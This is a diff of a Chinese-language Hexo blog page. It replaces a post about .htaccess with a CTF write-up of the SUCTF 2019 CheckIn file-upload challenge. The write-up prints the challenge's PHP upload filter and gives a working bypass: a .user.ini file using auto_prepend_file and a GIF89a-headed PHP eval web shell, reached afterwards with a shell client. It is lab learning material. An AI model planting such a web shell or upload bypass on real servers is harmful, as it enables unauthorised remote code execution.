@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>.htaccess文件 | Hexo</title>
+  <title>第一道文件上传题 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content=".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。">
+  <meta name="description" content="前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊">
 <meta property="og:type" content="article">
-<meta property="og:title" content=".htaccess文件">
-<meta property="og:url" content="http://yoursite.com/2019/09/28/htaccess文件/index.html">
+<meta property="og:title" content="第一道文件上传题">
+<meta property="og:url" content="http://yoursite.com/2019/10/09/第一道文件上传题/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content=".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。">
+<meta property="og:description" content="前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-09-28T07:46:27.198Z">
+<meta property="og:updated_time" content="2019-10-10T13:09:31.767Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content=".htaccess文件">
-<meta name="twitter:description" content=".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。">
+<meta name="twitter:title" content="第一道文件上传题">
+<meta name="twitter:description" content="前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -158,39 +158,76 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-htaccess文件" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-第一道文件上传题" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      .htaccess文件
+      第一道文件上传题
     </h1>
   
 
         
-        <a href="/2019/09/28/htaccess文件/" class="archive-article-date">
-  	<time datetime="2019-09-28T07:42:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-28</time>
+        <a href="/2019/10/09/第一道文件上传题/" class="archive-article-date">
+  	<time datetime="2019-10-09T14:45:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>.htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。</p>
+        <p>前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……<br>本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊</p>
 <a id="more"></a>
-<p>.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的</p>
-<p>.htaccess可以控制错误重定向，初始页面设置，文件夹的访问权限，文件的跳转等</p>
-<p>Nginx如果直接访问，可以下载该文件。如果是apache的话，正常情况下该文件是不可被访问的，但是可以通过php的include之类的文件包含函数进行内容访问</p>
-<p>其实最好不要用.htaccess文件，因为目录多了后，每个目录都有个.htaccess很难管理</p>
-<p>SetHandler</p>
-<p>描述：    强制所有匹配文件由处理程序处理<br>句法：    SetHandler handler-name|none|expression<br>语境：    服务器配置，虚拟主机，目录，.htaccess</p>
-<p>当放入一个.htaccess文件或 <directory>或 <location> 部分，该指令将强制所有匹配的文件通过解析处理程序给出 的处理程序名。例如，如果您有一个目录希望完全解析为imagemap规则文件，而不管其扩展名如何，则可以将以下内容放入.htaccess该目录中的 文件中：</location></directory></p>
-<pre><code>SetHandler imap文件</code></pre><p>您也可以使用此伪指令为具有特定文件扩展名的文件配置特定处理程序。例如：</p>
-<pre><code>&lt; FilesMatch “ \ .php $” &gt; SetHandler 应用程序/ x-httpd-php
- &lt;/ FilesMatch &gt; </code></pre><p>字符串值表达式可用于引用每个请求变量，包括对已命名正则表达式的反向引用：</p>
-<pre><code>&lt; LocationMatch ^ / app /（？&lt; sub &gt; [^ /] +）/&gt; SetHandler “ proxy：unix：/ var / run / app_％{env：MATCH_sub} .sock | fcgi：// localhost：8080” &lt;/ 位置匹配&gt; </code></pre><p>您可以SetHandler 使用value 覆盖先前定义的指令None。</p>
+<p>题目地址：<a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p>
+<hr>
+<p>拿到这道题，首先把所有学过的绕过方法试一遍，js,本地检验，双写，改写MIME文件类型，php345，点，空格，htaccess文件，结果全都没成功<br>随便上传一个txt文件，提示exif_imagetype:not image! 可知用了exif_imagetype函数判断文件是否是图片文件<br>再试试上传一个图片一句话木马，显示&lt;? in contents! 没上传成功<br>额。。。<br>到这我就无能为力了，知识有限呀 木得办法，只能去看源码了<br>接下来就是与源码斗智斗勇的过程了，php代码好难呀</p>
+<pre><code>&lt;?php
+// error_reporting(0);
+$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
+if (!file_exists($userdir)) {
+mkdir($userdir, 0777, true);
+    }
+file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);    //file_put_contents将一个字符串写入文件
+if (isset($_POST[&quot;upload&quot;])) {
+$tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];
+$name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];
+if (!$tmp_name) {
+    die(&quot;filesize too big!&quot;);
+}
+if (!$name) {
+    die(&quot;filename cannot be empty!&quot;);
+}
+$extension = substr($name, strrpos($name, &quot;.&quot;) + 1);
+if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) {              //匹配正则表达式，文件后缀名中不能含ph、htaccess,/i表示不区分大小写
+    die(&quot;illegal suffix!&quot;);
+}
+if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) {   //mb_strpos 检查字符串在另一个字符串中首次出现的位置
+    die(&quot;&amp;lt;? in contents!&quot;);                                    //文件中不能包含&lt;?
+}
+$image_type = exif_imagetype($tmp_name);       //exif_imagetype 检查文件是否是图片类型  可用文件头绕过，如GIF89A
+if (!$image_type) {
+    die(&quot;exif_imagetype:not image!&quot;);
+}
+$upload_file_path = $userdir . &quot;/&quot; . $name;
+move_uploaded_file($tmp_name, $upload_file_path);
+echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;
+echo &apos;Your files : &lt;br&gt;&apos;;
+var_dump(scandir($userdir));
+}</code></pre><p>废了好大劲，才看懂代码，<br>文件后缀名中不能含ph、htaccess，不区分大小写；文件中不能包含&lt;?；exif_imagetype 检查文件是否是图片类型<br>看到了这三个过滤，几乎无望，把我所学的方法全部禁用了，只能去看大佬们怎么绕过的。</p>
+<p>上传一个.uset.ini文件，再上传一个aa.jpg文件，然后用菜刀连接  网址/uploads/f4e7685fe689f675c85caeefaedcf40c/index.php<br>连接成功后，cd / 进入根目录<br>   cat flag 拿到flag<br>.user.ini 文件：<br>    GIF89a   //仅对于本题而言，只是为了绕过检查图片的那个函数<br>    auto_prepend_file=aa.jpg   //让php文件后面自动包含aa.jpg这个二年</p>
+<p>aa.jpg 文件：<br>    GIF89a<br>    &lt;script language=’php’  @eval($_POST[‘ye’]);<br>    </p>
+<hr>
+<p>##.uset.ini<br>在PHP中有个很有趣的东西叫.user.ini，有点类似.htaccess文件，PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果<br>关于PHP_INI_*一共有四种：</p>
+<pre><code>PHP_INI_USER 可在用户脚本以及.user.ini中设定
+
+PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定
+
+PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定
+
+PHP_INI_ALL 可在任何地方设定</code></pre><p>php官方文档中说，.user.ini可以设置 PHP_INI_PERDIR 和 PHP_INI_USER ，实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。<br>php配置项中，有两个项，auto_append_file、auto_prepend_file<br>auto_append_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
+<p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件。</p>
 
       
 
@@ -270,7 +307,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/28/htaccess文件/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/09/第一道文件上传题/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -284,18 +321,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/10/03/sql注入基础/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sql注入基础
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/09/27/初识文件包含漏洞/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">初识文件包含漏洞</div>
+    <a href="/2019/10/03/sql注入基础/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sql注入基础</div>
       <i class="icon-circle-right"></i>
     </a>
   
